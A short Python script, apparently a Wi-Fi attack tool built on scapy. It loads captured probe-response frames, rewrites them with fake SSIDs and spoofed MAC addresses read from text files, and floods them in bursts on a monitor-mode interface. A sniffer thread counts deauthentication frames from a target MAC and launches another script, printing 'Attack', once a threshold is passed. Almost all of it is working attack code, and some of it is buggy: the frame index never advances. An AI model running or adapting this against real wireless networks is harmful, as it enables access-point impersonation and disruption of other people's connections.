from scapy.all import *
import time
import threading

file = open("fakemac.txt", "r")
fmac = file.readlines()
file.close()

file = open("fakessid.txt", "r")
ssid = file.readlines()
file.close()

file = open("info.txt" , "r")
mac = file.readlines()
file.close()


#prequest = rdpcap("proberequest.pcap")
presponse = rdpcap("proberesponse.pcap")

i=0
count= 64

def r():
	global i
	while True:
		print "save"
		if i<len(mac):
			presponse[i][Dot11Elt:1].len = 5
			presponse[i][Dot11Elt:1].info = ssid[i]
			presponse[i].addr1 = fmac[i]
			presponse[i].addr2 = mac[0]
			presponse[i].addr3 = mac[0]
			sendp(presponse[0], iface = "mon0" ,count =64)	
			time.sleep(0.1)
		else:
			i= 0	




def deauth(frame):
	#print "Beacon Frame Finder"
	global count
	if frame.haslayer(Dot11):
			if frame.addr2 == mac[0]:
				if frame.type == 0 and frame.subtype == 12:
								count = count+1
								print "Count Increase"
								if (count > 64):
									os.system("python monitor.py")
									print "Attack"
									time.sleep(5)
									#os.system("python managedmode.py")
				


def s():
	while True:
		sniff(iface = "mon0" , prn = deauth, count = 1) 



t1=threading.Thread(target=s)
t2=threading.Thread(target=r)
t2.start()
t1.start()







